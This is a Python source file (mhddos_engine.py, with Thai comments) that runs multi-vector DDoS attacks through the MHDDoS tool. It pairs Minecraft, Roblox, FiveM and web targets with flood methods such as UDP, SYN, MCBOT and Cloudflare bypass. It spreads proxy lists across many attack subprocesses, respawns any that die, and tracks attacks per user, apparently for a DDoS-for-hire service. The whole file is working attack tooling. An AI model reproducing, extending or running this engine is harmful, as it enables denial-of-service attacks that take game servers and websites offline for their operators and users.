# mhddos_engine.py
"""
Multi-vector DDoS engine — 1 device spawn 3 sub-process (แต่ละ process 1 method)
"""
import asyncio
import os
import sys
import time
import traceback
from config import (
    MHDDOS_FULL, MHDDOS_DIR, MHDDOS_LAUNCHER,
    THREADS_PER_SUB_NODE, RPC_PER_SUB_NODE,
    MAX_RESPAWN_ATTEMPTS, RESPAWN_DELAY, ATTACK_LOG_DIR,
    proxy_slice_file,
)

# ── method ที่แต่ละ module ใช้ (multi-vector) ──
MULTI_VECTOR = {
    "minecraft": ["MINECRAFT", "MCBOT", "UDP"],
    "roblox":    ["UDP", "SYN", "CPS"],
    "fivem":     ["FIVEM", "UDP", "SYN"],
    "web":       ["BYPASS", "STRESS", "GET"],
    "web_cf":    ["CFB", "BYPASS", "STRESS"],
}

# module ที่เป็น L4 — ไม่ต้อง proxy
L4_MODULES = {"minecraft", "roblox", "fivem"}

# method ที่ต้อง proxy (L7 HTTP)
L7_METHODS = {"BYPASS", "CFB", "STRESS", "GET", "POST", "HEAD", "PPS"}


def _layer_of(method: str) -> str:
    return "L7" if method in L7_METHODS else "L4"


class MHDDoSEngine:
    def __init__(self):
        self.running: dict[int, list[dict]] = {}

    def _build_args(self, method: str, target: str, port: int,
                    duration: int, threads: int,
                    proxies_path: str, rpc: int) -> list[str]:
        layer = _layer_of(method)
        if layer == "L7":
            host = target if target.startswith("http") else f"http://{target}"
            if port and ":" not in host.split("//")[-1]:
                host = f"{host}:{port}"
            return [method, host, "5", str(threads),
                    proxies_path, str(rpc), str(duration)]
        else:
            host = target.split("//")[-1].split("/")[0]
            if ":" not in host:
                host = f"{host}:{port}"
            return [method, host, str(threads), str(duration)]

    async def _spawn(self, user_id: int, node_idx: int, args: list[str]) -> dict:
        os.makedirs(ATTACK_LOG_DIR, exist_ok=True)
        log_path = os.path.join(
            ATTACK_LOG_DIR, f"{user_id}_{node_idx}_{int(time.time())}.log"
        )
        log_f = open(log_path, "wb")
        proc = await asyncio.create_subprocess_exec(
            sys.executable, MHDDOS_LAUNCHER, *args,
            stdout=log_f,
            stderr=asyncio.subprocess.STDOUT,
            cwd=MHDDOS_DIR,
        )
        log_f.close()
        return {
            "proc": proc, "args": args, "log_path": log_path,
            "respawns": 0, "node_idx": node_idx,
        }

    async def start(self, user_id: int, module: str, target: str, port: int,
                    duration: int, devices: int,
                    proxy_slices: list[list[str]]):
        if user_id in self.running:
            raise RuntimeError("มี attack รันอยู่แล้ว")

        methods = MULTI_VECTOR.get(module)
        if not methods:
            raise ValueError(f"unknown module: {module}")

        # จำนวน node = devices × len(methods)
        total_nodes = devices * len(methods)

        # เขียน slice file
        for i in range(total_nodes):
            data = proxy_slices[i] if i < len(proxy_slices) else []
            with open(proxy_slice_file(user_id, i), "w") as f:
                f.write("\n".join(data))

        nodes: list[dict] = []
        idx = 0
        for d in range(devices):
            for method in methods:
                args = self._build_args(
                    method, target, port, duration,
                    THREADS_PER_SUB_NODE,
                    proxy_slice_file(user_id, idx),
                    RPC_PER_SUB_NODE,
                )
                try:
                    node = await self._spawn(user_id, idx, args)
                    nodes.append(node)
                except Exception:
                    traceback.print_exc()
                idx += 1
                await asyncio.sleep(0.05)

        if not nodes:
            raise RuntimeError("spawn sub-process ไม่สำเร็จ")

        self.running[user_id] = nodes
        return nodes

    async def _respawn(self, user_id: int, node: dict) -> bool:
        if node["respawns"] >= MAX_RESPAWN_ATTEMPTS:
            return False
        await asyncio.sleep(RESPAWN_DELAY)
        try:
            new_node = await self._spawn(
                user_id, node["node_idx"], node["args"]
            )
            new_node["respawns"] = node["respawns"] + 1
            nodes = self.running.get(user_id, [])
            for i, n in enumerate(nodes):
                if n is node:
                    nodes[i] = new_node
                    break
            return True
        except Exception:
            traceback.print_exc()
            return False

    async def _watcher(self, user_id: int):
        while True:
            await asyncio.sleep(3)
            nodes = self.running.get(user_id)
            if not nodes:
                return
            for node in list(nodes):
                if node["proc"].returncode is not None:
                    await self._respawn(user_id, node)

    async def stop(self, user_id: int):
        nodes = self.running.pop(user_id, [])
        if not nodes:
            return
        for node in nodes:
            proc = node["proc"]
            if proc.returncode is None:
                try:
                    proc.terminate()
                except Exception:
                    pass
        for node in nodes:
            proc = node["proc"]
            if proc.returncode is None:
                try:
                    await asyncio.wait_for(proc.wait(), timeout=3)
                except asyncio.TimeoutError:
                    try:
                        proc.kill()
                    except Exception:
                        pass
                except Exception:
                    pass
        for node in nodes:
            try:
                os.remove(node["log_path"])
            except OSError:
                pass
        for i in range(100):
            try:
                os.remove(proxy_slice_file(user_id, i))
            except OSError:
                continue

    def is_running(self, user_id: int) -> bool:
        nodes = self.running.get(user_id, [])
        return any(n["proc"].returncode is None for n in nodes)

    def alive_count(self, user_id: int) -> tuple[int, int]:
        nodes = self.running.get(user_id, [])
        alive = sum(1 for n in nodes if n["proc"].returncode is None)
        return alive, len(nodes)

    async def shutdown_all(self):
        for uid in list(self.running.keys()):
            await self.stop(uid)